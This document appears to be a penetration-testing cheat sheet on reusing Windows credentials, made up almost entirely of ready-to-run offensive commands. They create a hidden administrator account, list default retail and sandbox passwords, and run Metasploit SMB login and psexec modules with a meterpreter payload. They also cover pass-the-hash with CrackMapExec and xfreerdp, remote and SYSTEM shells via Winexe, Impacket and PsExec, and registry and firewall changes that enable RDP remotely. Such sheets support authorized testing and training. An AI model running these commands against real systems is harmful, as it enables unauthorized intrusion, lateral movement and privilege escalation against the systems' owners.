# Windows - Using credentials

## TIP 1 - Create your credential :D

```powershell
net user hacker hacker /add
net localgroup administrators hacker /add
```

Some info about your user

```powershell
net user /dom
net user /domain
```

## TIP 2 - Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin

```powershell
Username: RetailAdmin
Password: trs10
```

## TIP - Sandbox Credential - WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)

Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard

```powershell
\\windowssandbox
Username: wdagutilityaccount
Password: pw123
```


## Metasploit - SMB

```c
use auxiliary/scanner/smb/smb_login  
set SMBDomain CSCOU  
set SMBUser jarrieta
set SMBPass nastyCutt3r
services -p 445 -R  
run
creds
```

## Metasploit - Psexec

Note: the password can be replaced by a hash to execute a `pass the hash` attack.

```c
use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser jarrieta
set SMBPass nastyCutt3r
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

## Crackmapexec (Integrated to Kali)

```python
git clone https://github.com/byt3bl33d3r/CrackMapExec.github
python crackmapexec.py 10.9.122.0/25 -d CSCOU -u jarrieta -p nastyCutt3r
python crackmapexec.py 10.9.122.5 -d CSCOU -u jarrieta -p nastyCutt3r -x whoami
```

## Crackmapexec (Pass The Hash)

```powershell
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5509de4ff0a6eed7048d9f4a61100e51' --local-auth
```

## Winexe (Integrated to Kali)

```python
winexe -U CSCOU/jarrieta%nastyCutt3r //10.9.122.5 cmd.exe
```

## Psexec.py / Smbexec.py / Wmiexec.py (Impacket)

```python
git clone https://github.com/CoreSecurity/impacket.git
python psexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
python smbexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
python wmiexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
```

## RDP Remote Desktop Protocol (Impacket)

```powershell
python rdpcheck.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5 -g 70 -r disk:share=/home/user/myshare
# -g : the screen will take up 70% of your actual screen size
# -r disk:share : sharing a local folder during a remote desktop session 
```

Note: you may need to enable it with the following command

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

or with psexec(sysinternals)

```powershell
psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
```

or with crackmapexec

```powershell
crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```

For Server 2012 R2, Win8.1+

```powershell
xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:192.168.1.12
```

with Metasploit

```powershell
run getgui -u admin -p 1234
```

## Netuse (Windows)

```powershell
net use \\ordws01.cscou.lab /user:CSCOU\jarrieta nastyCutt3r
C$
```

## Runas (Windows - Kerberos auth)

```powershell
runas /netonly /user:CSCOU\jarrieta "cmd.exe"
```

## PsExec (Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) )

```powershell
PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe
PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe -s  # get System shell
```

## References

- [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
